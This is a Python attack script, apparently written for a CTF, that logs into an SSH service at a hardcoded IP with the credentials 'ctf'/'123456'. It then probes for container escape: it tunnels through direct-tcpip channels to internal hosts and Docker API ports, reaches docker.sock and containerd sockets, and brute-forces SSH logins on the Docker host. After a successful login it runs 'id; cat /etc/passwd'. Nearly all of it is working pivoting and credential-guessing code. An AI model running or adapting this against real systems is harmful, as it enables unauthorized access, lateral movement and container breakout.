#!/usr/bin/env python3
"""
SSH Agent Forwarding深度探索
重点研究agent forwarding是否可以被利用
"""

import paramiko
import socket
import struct
import time
import threading

HOST = "61.147.171.105"
PORT = 55300
USERNAME = "ctf"
PASSWORD = "123456"

def get_ssh_client():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, USERNAME, PASSWORD)
    return client

def test_agent_forwarding_deeply():
    """深入测试Agent Forwarding"""
    print("=" * 60)
    print("[*] Agent Forwarding深度测试")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 请求agent forwarding
    print("\n[1] 请求Agent Forwarding...")
    try:
        result = transport.request_port_forward('', 0)
        print(f"端口转发请求结果: {result}")
    except Exception as e:
        print(f"端口转发请求失败: {e}")
    
    # 尝试打开agent通道
    print("\n[2] 尝试打开auth-agent通道...")
    try:
        # 尝试openssh风格
        chan = transport.open_channel("auth-agent@openssh.com")
        print("auth-agent@openssh.com通道打开成功!")
        chan.close()
    except Exception as e:
        print(f"auth-agent@openssh.com失败: {e}")
    
    try:
        # 尝试标准风格
        chan = transport.open_channel("auth-agent")
        print("auth-agent通道打开成功!")
        chan.close()
    except Exception as e:
        print(f"auth-agent失败: {e}")
    
    # 检查远程是否有agent socket
    print("\n[3] 检查远程SSH_AUTH_SOCK...")
    channel = client.invoke_shell()
    time.sleep(0.5)
    channel.send("echo SSH_AUTH_SOCK=$SSH_AUTH_SOCK\n")
    time.sleep(0.5)
    output = channel.recv(4096).decode('utf-8', errors='ignore')
    print(output)
    
    channel.send("env | grep -i ssh\n")
    time.sleep(0.5)
    output = channel.recv(4096).decode('utf-8', errors='ignore')
    print(output)
    
    channel.send("ls -la /tmp/ssh-* 2>/dev/null || echo 'No agent sockets'\n")
    time.sleep(0.5)
    output = channel.recv(4096).decode('utf-8', errors='ignore')
    print(output)
    
    channel.close()
    client.close()

def test_reverse_port_forward():
    """测试反向端口转发"""
    print("\n" + "=" * 60)
    print("[*] 反向端口转发测试")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 请求反向端口转发
    print("\n[1] 请求反向端口转发...")
    try:
        port = transport.request_port_forward('127.0.0.1', 0)
        print(f"反向端口转发成功，监听端口: {port}")
        
        # 尝试在远程连接这个端口
        channel = client.invoke_shell()
        time.sleep(0.5)
        channel.send(f"nc 127.0.0.1 {port} 2>&1 &\n")
        time.sleep(1)
        output = channel.recv(4096).decode('utf-8', errors='ignore')
        print(f"远程连接尝试: {output}")
        channel.close()
        
        transport.cancel_port_forward('127.0.0.1', port)
    except Exception as e:
        print(f"反向端口转发失败: {e}")
    
    # 尝试绑定到0.0.0.0
    print("\n[2] 请求绑定到0.0.0.0...")
    try:
        port = transport.request_port_forward('0.0.0.0', 0)
        print(f"0.0.0.0绑定成功，端口: {port}")
        transport.cancel_port_forward('0.0.0.0', port)
    except Exception as e:
        print(f"0.0.0.0绑定失败: {e}")
    
    # 尝试绑定特定端口
    print("\n[3] 请求绑定特定端口...")
    for test_port in [22, 80, 8080, 2222]:
        try:
            result_port = transport.request_port_forward('127.0.0.1', test_port)
            print(f"端口{test_port}绑定成功，实际端口: {result_port}")
            transport.cancel_port_forward('127.0.0.1', result_port)
        except Exception as e:
            print(f"端口{test_port}绑定失败: {e}")
    
    client.close()

def test_ssh_through_forwarded_port():
    """测试通过转发端口进行SSH"""
    print("\n" + "=" * 60)
    print("[*] 通过转发端口SSH测试")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 建立到172.17.0.1:22的直接通道
    print("\n[1] 直接通道到172.17.0.1:22...")
    try:
        chan = transport.open_channel(
            "direct-tcpip",
            ("172.17.0.1", 22),
            ("127.0.0.1", 0)
        )
        
        # 读取banner
        banner = chan.recv(1024).decode('utf-8', errors='ignore')
        print(f"Banner: {banner.strip()}")
        
        # 尝试通过这个通道建立SSH
        sock = chan
        
        print("\n[2] 通过通道建立SSH连接...")
        inner_client = paramiko.SSHClient()
        inner_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # 测试不同的用户名
        test_users = ["root", "ctf", "ubuntu", "admin", "flag", "user"]
        test_passwords = ["123456", "password", "root", "", "flag", "ctf"]
        
        for user in test_users:
            for pwd in test_passwords[:2]:  # 限制测试次数
                try:
                    # 每次都需要新通道
                    chan2 = transport.open_channel(
                        "direct-tcpip",
                        ("172.17.0.1", 22),
                        ("127.0.0.1", 0)
                    )
                    inner_client2 = paramiko.SSHClient()
                    inner_client2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    inner_client2.connect(
                        hostname="172.17.0.1",
                        username=user,
                        password=pwd,
                        sock=chan2,
                        timeout=5
                    )
                    print(f"!!! 成功: {user}:{pwd}")
                    
                    # 执行命令
                    stdin, stdout, stderr = inner_client2.exec_command("id; cat /etc/passwd | head -5")
                    print(stdout.read().decode())
                    inner_client2.close()
                except paramiko.AuthenticationException:
                    pass  # 静默处理认证失败
                except Exception as e:
                    print(f"  {user}:{pwd} - {e}")
        
        chan.close()
    except Exception as e:
        print(f"直接通道失败: {e}")
    
    client.close()

def test_streamlocal_forwarding():
    """测试Unix域套接字转发"""
    print("\n" + "=" * 60)
    print("[*] Unix域套接字转发测试 (streamlocal)")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 尝试转发到远程Unix socket
    socket_paths = [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/tmp/ssh-agent.sock",
        "/run/containerd/containerd.sock",
        "/var/run/secrets/kubernetes.io/serviceaccount/token"
    ]
    
    for sock_path in socket_paths:
        print(f"\n尝试连接: {sock_path}")
        try:
            # 使用direct-streamlocal@openssh.com通道类型
            msg = paramiko.Message()
            msg.add_string(sock_path)  # socket path
            msg.add_string("")  # reserved
            msg.add_int(0)  # reserved
            
            chan = transport.open_channel(
                "direct-streamlocal@openssh.com",
                dest_addr=sock_path,
                src_addr=("", 0)
            )
            print(f"  连接成功!")
            
            # 尝试发送数据
            if "docker" in sock_path:
                chan.send(b"GET /info HTTP/1.0\r\n\r\n")
                time.sleep(0.5)
                response = chan.recv(4096)
                print(f"  响应: {response[:200]}")
            chan.close()
        except Exception as e:
            print(f"  失败: {e}")
    
    client.close()

def test_global_request():
    """测试全局请求"""
    print("\n" + "=" * 60)
    print("[*] SSH全局请求测试")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 测试各种全局请求
    requests = [
        ("tcpip-forward", b"127.0.0.1\x00\x00\x00\x00"),
        ("cancel-tcpip-forward", b"127.0.0.1\x00\x00\x00\x00"),
        ("no-more-sessions@openssh.com", b""),
        ("hostkeys-00@openssh.com", b""),
        ("hostkeys-prove-00@openssh.com", b""),
    ]
    
    for req_type, data in requests:
        print(f"\n请求类型: {req_type}")
        try:
            result = transport.global_request(req_type, data, wait=True)
            print(f"  结果: {result}")
        except Exception as e:
            print(f"  失败: {e}")
    
    client.close()

def analyze_nested_ssh_with_agent():
    """分析嵌套SSH中的agent行为"""
    print("\n" + "=" * 60)
    print("[*] 嵌套SSH + Agent分析")
    print("=" * 60)
    
    client = get_ssh_client()
    
    # 尝试在shell中进行ssh并观察agent行为
    channel = client.invoke_shell()
    time.sleep(0.5)
    channel.recv(4096)  # 清空
    
    print("\n[1] 尝试使用ssh-agent...")
    channel.send("eval $(ssh-agent) 2>&1\n")
    time.sleep(0.5)
    output = channel.recv(4096).decode('utf-8', errors='ignore')
    print(output)
    
    print("\n[2] 检查agent状态...")
    channel.send("ssh-add -l 2>&1\n")
    time.sleep(0.5)
    output = channel.recv(4096).decode('utf-8', errors='ignore')
    print(output)
    
    print("\n[3] 检查是否能执行ssh命令...")
    channel.send("which ssh 2>&1\n")
    time.sleep(0.5)
    output = channel.recv(4096).decode('utf-8', errors='ignore')
    print(output)
    
    print("\n[4] 尝试从容器内SSH到172.17.0.1...")
    channel.send("ssh -v -o StrictHostKeyChecking=no ctf@172.17.0.1 2>&1 &\n")
    time.sleep(2)
    output = channel.recv(4096).decode('utf-8', errors='ignore')
    print(output)
    
    channel.close()
    client.close()

def test_special_channel_messages():
    """测试特殊通道消息"""
    print("\n" + "=" * 60)
    print("[*] 特殊通道消息测试")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 打开一个session通道
    channel = transport.open_channel("session")
    
    print("\n[1] 发送各种channel请求...")
    
    # 测试pty请求
    print("  pty-req...")
    try:
        result = channel.get_pty(term='xterm', width=80, height=24)
        print(f"    成功: {result}")
    except Exception as e:
        print(f"    失败: {e}")
    
    # 测试subsystem
    print("  subsystem sftp...")
    try:
        channel2 = transport.open_channel("session")
        channel2.invoke_subsystem('sftp')
        print("    成功!")
        response = channel2.recv(1024)
        print(f"    响应: {response[:50]}")
        channel2.close()
    except Exception as e:
        print(f"    失败: {e}")
    
    # 测试其他subsystem
    for subsys in ['netconf', 'shell', 'exec']:
        print(f"  subsystem {subsys}...")
        try:
            channel3 = transport.open_channel("session")
            channel3.invoke_subsystem(subsys)
            print(f"    成功!")
            channel3.close()
        except Exception as e:
            print(f"    失败: {e}")
    
    channel.close()
    client.close()

def test_direct_connection_to_internal():
    """测试直接连接到内部服务"""
    print("\n" + "=" * 60)
    print("[*] 内部服务连接测试")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 测试连接到各种内部服务
    targets = [
        ("172.17.0.1", 22),     # 真实Ubuntu SSH
        ("172.17.0.2", 80),     # Rancher metadata
        ("169.254.169.250", 53), # DNS
        ("10.42.0.1", 22),      # 可能的gateway
        ("10.42.0.1", 80),      # 可能的gateway HTTP
        ("localhost", 25),      # SMTP?
        ("127.0.0.1", 9100),    # 可能的Node exporter
        ("172.17.0.1", 2375),   # Docker API
        ("172.17.0.1", 2376),   # Docker API TLS
    ]
    
    for host, port in targets:
        try:
            chan = transport.open_channel(
                "direct-tcpip",
                (host, port),
                ("127.0.0.1", 0)
            )
            # 尝试读取banner
            chan.settimeout(2)
            try:
                banner = chan.recv(1024)
                print(f"[+] {host}:{port} - {banner[:100]}")
            except socket.timeout:
                print(f"[+] {host}:{port} - 连接成功但无响应")
            chan.close()
        except Exception as e:
            print(f"[-] {host}:{port} - {e}")
    
    client.close()

if __name__ == "__main__":
    test_agent_forwarding_deeply()
    test_reverse_port_forward()
    test_ssh_through_forwarded_port()
    test_streamlocal_forwarding()
    test_global_request()
    analyze_nested_ssh_with_agent()
    test_special_channel_messages()
    test_direct_connection_to_internal()
